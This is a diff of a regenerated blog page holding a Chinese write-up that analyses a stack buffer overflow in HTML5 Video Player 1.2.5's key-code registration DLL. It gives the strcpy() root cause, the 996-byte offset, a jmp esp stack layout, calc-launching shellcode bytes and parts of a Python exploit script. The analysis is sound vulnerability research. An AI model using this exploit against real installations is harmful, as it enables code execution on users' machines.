@@ -34,7 +34,7 @@ app &amp;amp; exp
 
 
 
-<meta name="generator" content="Hugo 0.55.2" />
+<meta name="generator" content="Hugo 0.75.1" />
 
 
 <link rel="canonical" href="https://bash-c.github.io/post/html5-video-player-1.2.5-local-buffer-overflow-analysis/" />
@@ -62,25 +62,20 @@ app &amp;amp; exp
 <meta property="og:title" content="HTML5 Video Player 1.2.5 缓冲区溢出分析" />
 <meta property="og:description" content="
 放假前最后一天看到 exploit-db 上出了一个 HTML5 Video Player 的缓冲区溢出的 exploit，版本是 1.2.5，（无心工作）就分析了一下这个漏洞，是一个比较简单的栈溢出漏洞，简单记录一下。
-
 app &amp; exp
 " />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://bash-c.github.io/post/html5-video-player-1.2.5-local-buffer-overflow-analysis/" />
-<meta property="article:published_time" content="2019-01-30T23:30:42&#43;08:00"/>
-<meta property="article:modified_time" content="2019-01-30T23:30:42&#43;08:00"/>
-
+<meta property="article:published_time" content="2019-01-30T23:30:42+08:00" />
+<meta property="article:modified_time" content="2019-01-30T23:30:42+08:00" />
 <meta itemprop="name" content="HTML5 Video Player 1.2.5 缓冲区溢出分析">
 <meta itemprop="description" content="
 放假前最后一天看到 exploit-db 上出了一个 HTML5 Video Player 的缓冲区溢出的 exploit，版本是 1.2.5，（无心工作）就分析了一下这个漏洞，是一个比较简单的栈溢出漏洞，简单记录一下。
-
 app &amp; exp
 ">
-
-
-<meta itemprop="datePublished" content="2019-01-30T23:30:42&#43;08:00" />
-<meta itemprop="dateModified" content="2019-01-30T23:30:42&#43;08:00" />
-<meta itemprop="wordCount" content="0">
+<meta itemprop="datePublished" content="2019-01-30T23:30:42+08:00" />
+<meta itemprop="dateModified" content="2019-01-30T23:30:42+08:00" />
+<meta itemprop="wordCount" content="1816">
 
 
 
@@ -89,7 +84,6 @@ app &amp; exp
 <meta name="twitter:title" content="HTML5 Video Player 1.2.5 缓冲区溢出分析"/>
 <meta name="twitter:description" content="
 放假前最后一天看到 exploit-db 上出了一个 HTML5 Video Player 的缓冲区溢出的 exploit，版本是 1.2.5，（无心工作）就分析了一下这个漏洞，是一个比较简单的栈溢出漏洞，简单记录一下。
-
 app &amp; exp
 "/>
 
@@ -331,8 +325,8 @@ app &amp; exp
             <a href="https://bash-c.github.io/categories/how2/"> how2 </a>
             
           </div>
-        <span class="more-meta"> 0 words </span>
-          <span class="more-meta"> 0 min read </span>
+        <span class="more-meta"> 1816 words </span>
+          <span class="more-meta"> 4 min read </span>
 
         
         
@@ -352,13 +346,10 @@ app &amp; exp
   <h2 class="post-toc-title">Table of Contents</h2>
   <div class="post-toc-content">
     <nav id="TableOfContents">
-<ul>
-<li>
-<ul>
-<li><a href="#question">Question：</a></li>
-<li><a href="#todo">Todo：</a></li>
-</ul></li>
-</ul>
+  <ul>
+    <li><a href="#question">Question：</a></li>
+    <li><a href="#todo">Todo：</a></li>
+  </ul>
 </nav>
   </div>
 </div>
@@ -367,37 +358,32 @@ app &amp; exp
     <div class="post-content">
       <blockquote>
 <p>放假前最后一天看到 <a href="https://www.exploit-db.com/exploits/46279">exploit-db</a> 上出了一个 HTML5 Video Player 的缓冲区溢出的 exploit，版本是 1.2.5，（无心工作）就分析了一下这个漏洞，是一个比较简单的栈溢出漏洞，简单记录一下。</p>
-
 <p><a href="https://github.com/bash-c/VULs-analysis/tree/master/HTML5-Video-Player-1.2.5-Local-Buffer-Overflow">app &amp; exp</a></p>
 </blockquote>
-
 <p>因为最近在练习 windows 平台挖洞和写 exploit 的能力，因此就只看了 PoC 的说明部分：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
-</span></pre></td>
+</span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"># PoC:
+<pre class="chroma"><code class="language-fallback" data-lang="fallback"># PoC:
 # 1.) Generate exploit.txt, copy the contents to clipboard
 # 2.) In application, open &#39;Help&#39; then &#39;Register&#39;
 # 3.) Paste the contents of exploit.txt under &#39;KEY CODE&#39;
-# 4.) Click OK - Calc POPS!</pre></td></tr></table>
+# 4.) Click OK - Calc POPS!
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>看起来溢出发生在注册时，先安装软件，查壳。</p>
-
-<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fzp1tsoom3j30g2098gm6.jpg" alt="" /></p>
-
+</div><p>看起来溢出发生在注册时，先安装软件，查壳。</p>
+<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fzp1tsoom3j30g2098gm6.jpg" alt=""></p>
 <p><code>.NET</code> 架构，搜了一下发现 <code>C#</code> 难以出现 <a href="https://stackoverflow.com/questions/9343665/are-buffer-overflow-exploits-possible-in-c">溢出漏洞</a>，因此猜测溢出发生在 dll 中。</p>
-
 <p>使用 <code>dnspy</code> 打开文件，通过搜索注册时的字符串 <code>Key Code</code> 定位到关键的代码在 <code>HTML5VideoPlayer.RegisterDialog.okButton_Click()</code></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C#" data-lang="C#"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -433,11 +419,10 @@ app &amp; exp
 		<span class="p">}</span>
 </code></pre></td></tr></table>
 </div>
-</div>
-<p>在 <code>Key Code</code> 栏中输入一串超长的字符串，然后点 <code>OK</code> 注册，发现程序直接 crash，既没有注册成功的弹窗，也没有注册失败的弹窗，说明溢出发生在 <code>CallKeyCodeDLL.isRegisterVersion()</code> 中。查看该函数：</p>
+</div><p>在 <code>Key Code</code> 栏中输入一串超长的字符串，然后点 <code>OK</code> 注册，发现程序直接 crash，既没有注册成功的弹窗，也没有注册失败的弹窗，说明溢出发生在 <code>CallKeyCodeDLL.isRegisterVersion()</code> 中。查看该函数：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C#" data-lang="C#"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -469,13 +454,11 @@ app &amp; exp
 		<span class="p">}</span>
 </code></pre></td></tr></table>
 </div>
-</div>
-<p>该函数又调用了<code>makeSureEngineInit()</code> 和 <code>funcDLLVerifyKeyCode()</code> 两个函数，其中 <code>CallKeyCodeDLL.funcDLLVerifyKeyCode()</code> 传递了输入的 <code>userName</code>  和 <code>keyCode</code>，从函数名字来看，溢出就发生在这里了。</p>
-
+</div><p>该函数又调用了<code>makeSureEngineInit()</code> 和 <code>funcDLLVerifyKeyCode()</code> 两个函数，其中 <code>CallKeyCodeDLL.funcDLLVerifyKeyCode()</code> 传递了输入的 <code>userName</code>  和 <code>keyCode</code>，从函数名字来看，溢出就发生在这里了。</p>
 <p>查看该函数的定义，是 <code>KeyCodeDLL.dll</code> 中的导出函数，溢出应该就发生在这个函数中了。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C#" data-lang="C#"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
@@ -485,25 +468,17 @@ app &amp; exp
 		<span class="k">private</span> <span class="k">static</span> <span class="k">extern</span> <span class="kt">int</span> <span class="n">funcDLLVerifyKeyCode</span><span class="p">(</span><span class="kt">string</span> <span class="n">strUserName</span><span class="p">,</span> <span class="kt">string</span> <span class="n">strKeyCode</span><span class="p">);</span>
 </code></pre></td></tr></table>
 </div>
-</div>
-<p>通过调试验证了猜想。</p>
-
-<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fzp2noufntj30qr0argm9.jpg" alt="" /></p>
-
+</div><p>通过调试验证了猜想。</p>
+<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fzp2noufntj30qr0argm9.jpg" alt=""></p>
 <p>继续 <code>step over</code>，程序 crash。</p>
-
 <p>使用 IDA 打开 <code>KeyCodeDll.dll</code> 寻找<code>funcDLLVerifyKeyCode()</code> 函数，但尴尬的是 dll 被去除了符号表，使用 IDA 看不出函数名，乱翻了几个函数后思考了一下，虽然 dll 没有符号表，但还是能看出导出函数的，于是直接拿 <code>ollydbg</code> 加载程序，查看 <code>KeyCodeDll.dll</code> 的导出函数。</p>
-
-<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fzp2y2lt6uj30dv05y74l.jpg" alt="" /></p>
-
+<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fzp2y2lt6uj30dv05y74l.jpg" alt=""></p>
 <p>发现只有两个导出函数不确定，应该就是 <code>makeSureEngineInit()</code> 和 <code>funcDLLVerifyKeyCode()</code> 了。分别对两个函数下断点，根据参数调试发现 <code>0x43010D0</code> 是要找的函数。</p>
-
-<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fzp31403qsj313v0gv40m.jpg" alt="" /></p>
-
+<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fzp31403qsj313v0gv40m.jpg" alt=""></p>
 <p>在 IDA 中查看该函数，发现又调用了另一个函数</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -524,13 +499,13 @@ app &amp; exp
 </span><span class="c1"></span>  <span class="k">else</span>
     <span class="n">result</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
   <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
-<span class="p">}</span></code></pre></td></tr></table>
+<span class="p">}</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>继续查看</p>
+</div><p>继续查看</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -651,13 +626,13 @@ app &amp; exp
     <span class="p">}</span>
   <span class="p">}</span>
   <span class="k">return</span> <span class="n">v4</span><span class="p">[</span><span class="mi">68</span><span class="p">];</span>
-<span class="p">}</span></code></pre></td></tr></table>
+<span class="p">}</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>分析到这，就很容易发现漏洞原因了，<code>strcpy()</code> 未检测长度造成了栈溢出</p>
+</div><p>分析到这，就很容易发现漏洞原因了，<code>strcpy()</code> 未检测长度造成了栈溢出</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -672,42 +647,38 @@ app &amp; exp
 </span><span class="c1"></span><span class="p">......</span>
 <span class="p">......</span>
   <span class="n">strcpy</span><span class="p">(</span><span class="n">v11</span><span class="p">,</span> <span class="n">username</span><span class="p">);</span>                        <span class="c1">// overflow
-</span><span class="c1"></span>  <span class="n">strcpy</span><span class="p">(</span><span class="n">v12</span><span class="p">,</span> <span class="n">keycode</span><span class="p">);</span>                         <span class="o">//</span> <span class="n">overflow</span></code></pre></td></tr></table>
+</span><span class="c1"></span>  <span class="n">strcpy</span><span class="p">(</span><span class="n">v12</span><span class="p">,</span> <span class="n">keycode</span><span class="p">);</span>                         <span class="c1">// overflow
+</span></code></pre></td></tr></table>
 </div>
-</div>
-<p>并且发现除了 exploit-db 上指明的 KeyCode 可以造成溢出外，UserName 同样也可以造成溢出。</p>
-
+</div><p>并且发现除了 exploit-db 上指明的 KeyCode 可以造成溢出外，UserName 同样也可以造成溢出。</p>
 <p>分析了一下函数逻辑后，发现 <code>v12</code> 这个变量在拷贝完 keycode 后就没有再使用过，因此使用这个变量溢出更方便。</p>
-
 <p>查看汇编，发现该函数使用 <code>esp</code> 寻址，因此就不能确定覆盖返回地址所需的长度是 <code>0x3E4 + 0x4 = 1000</code> 了，但大致也在这个附近，使用 msf 的 pattern 功能，经过调试发现覆盖返回地址需要 <code>996</code> 个字节的字符串。又观察了 <code>vul()</code> 函数后发现函数最后的 <code>Epilogue</code> 不是 <code>ret</code> 而是 <code>retn 0Ch</code>，因此除了覆盖函数返回地址还需要再填充 12 位无用字符。</p>
-
 <p>测试的环境是 <code>windows xp sp3</code>，既没有 ASLR 也没有 DEP，因此可以构造如下的栈结构</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
 </span><span class="lnt">6
 </span><span class="lnt">7
-</span></pre></td>
+</span></code></pre></td>
 <td class="lntd">
-<pre class="chroma">padding(996)
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">padding(996)
 ---------------
 jmp_esp address
 ---------------
 padding(12)
 ---------------
-shellcode</pre></td></tr></table>
+shellcode
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>windows 中经常使用 <code>jmp esp + shellcode</code> 的方法，第一次是在 <code>Jarvis OJ</code> 的 <code>BackDoor</code> 这道 <a href="http://m4x.fun/post/jarvisoj-pwn-writeup/#backdoor-200">题目</a> 中见到了这种技巧。</p>
-
+</div><p>windows 中经常使用 <code>jmp esp + shellcode</code> 的方法，第一次是在 <code>Jarvis OJ</code> 的 <code>BackDoor</code> 这道 <a href="http://m4x.fun/post/jarvisoj-pwn-writeup/#backdoor-200">题目</a> 中见到了这种技巧。</p>
 <p>写了一段弹计算器的 shellcode，需要注意不能出现截断 <code>strcpy()</code> 的字符</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -722,13 +693,13 @@ shellcode</pre></td></tr></table>
 </span><span class="c"></span><span class="no">shellcode</span> <span class="err">+=</span> <span class="err">&#34;\</span><span class="no">x54</span><span class="err">&#34;</span>                 <span class="c"># push dword ptr esp  
 </span><span class="c"></span><span class="no">shellcode</span> <span class="err">+=</span> <span class="err">&#34;\</span><span class="no">xBA</span><span class="err">\</span><span class="no">xC7</span><span class="err">\</span><span class="no">x93</span><span class="err">\</span><span class="no">xbf</span><span class="err">\</span><span class="no">x77</span><span class="err">&#34;</span> <span class="c"># mov edx, 0x77bf93c7 (mov edx, system)
 </span><span class="c"></span><span class="no">shellcode</span> <span class="err">+=</span> <span class="err">&#34;\</span><span class="no">xFF</span><span class="err">\</span><span class="no">xD2</span><span class="err">&#34;</span><span class="c">;            # call edx  
-</span><span class="c"></span><span class="no">shellcode</span> <span class="err">+=</span> <span class="err">&#34;\</span><span class="no">x90</span><span class="err">&#34;</span> <span class="p">*</span> <span class="mi">2</span>				<span class="err">#</span> <span class="no">suffix</span></code></pre></td></tr></table>
+</span><span class="c"></span><span class="no">shellcode</span> <span class="err">+=</span> <span class="err">&#34;\</span><span class="no">x90</span><span class="err">&#34;</span> <span class="p">*</span> <span class="mi">2</span>				<span class="c"># suffix
+</span></code></pre></td></tr></table>
 </div>
-</div>
-<p>完整的 <a href="https://github.com/bash-c/VULs-analysis/blob/master/HTML5-Video-Player-1.2.5-Local-Buffer-Overflow/exp.py">exploit</a></p>
+</div><p>完整的 <a href="https://github.com/bash-c/VULs-analysis/blob/master/HTML5-Video-Player-1.2.5-Local-Buffer-Overflow/exp.py">exploit</a></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -767,23 +738,17 @@ shellcode</pre></td></tr></table>
 
 <span class="c1"># print(payload)</span>
 <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;exploit.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;wb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
-    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span></code></pre></td></tr></table>
+    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>使用方法是把 <code>exploit.txt</code> 中的内容复制到 <code>Help -&gt; Register - Key Code</code> 中，然后点击 <code>OK</code> 。</p>
-
+</div><p>使用方法是把 <code>exploit.txt</code> 中的内容复制到 <code>Help -&gt; Register - Key Code</code> 中，然后点击 <code>OK</code> 。</p>
 <p>效果图：</p>
-
-<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fzp3vgxlb9j30vt0jt3zp.jpg" alt="" /></p>
-
+<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fzp3vgxlb9j30vt0jt3zp.jpg" alt=""></p>
 <h2 id="question">Question：</h2>
-
 <ul>
 <li>直接用长字符串触发 crash，使用 ollydbg 查看调用堆栈，看不到 dll 中的函数，不知是环境问题还是操作有问题</li>
 </ul>
-
 <h2 id="todo">Todo：</h2>
-
 <ul>
 <li>分析如何绕过注册机制</li>
 </ul>
@@ -919,7 +884,7 @@ shellcode</pre></td></tr></table>
     &copy;
     
        -
-    2019
+    2020
     <span class="heart">
       
       <i class="iconfont">
